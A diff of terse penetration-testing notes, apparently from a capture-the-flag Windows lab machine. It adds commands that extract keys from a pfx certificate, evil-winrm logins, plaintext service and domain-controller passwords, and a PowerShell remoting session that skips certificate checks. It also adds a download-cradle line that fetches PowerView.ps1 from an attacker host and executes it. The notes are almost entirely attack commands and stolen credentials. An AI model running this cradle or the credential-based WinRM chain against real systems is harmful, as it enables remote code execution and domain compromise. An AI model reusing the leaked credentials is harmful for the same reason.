@@ -93,8 +93,26 @@ thuglegacy
 
 Extract Certifcate + private key
 openssl pkcs12 -in datei.pfx -nocerts -out key.pem -nodes
+
+openssl pkcs12 -in [yourfile.pfx] -clcerts -nokeys -out [drlive.crt]
+
+
 openssl pkcs12 -in datei.pfx -nokeys -out cert.pem
 
 'evil-winrm -i <IP> -k file.key -c file.crt -S -r timelapse'
 evil-winrm -i $TARGET -k legacyy_dev_auth.pfx -u 'Administrator' -p 'thuglegacy'
 
+svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
+
+
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+
+
+iex(new-object net.webclient).downloadstring(‘http://10.10.14.118/PowerView.ps1')
+
+DC01 Z(q%!,5.mq3g3hxG7(2)&C6{
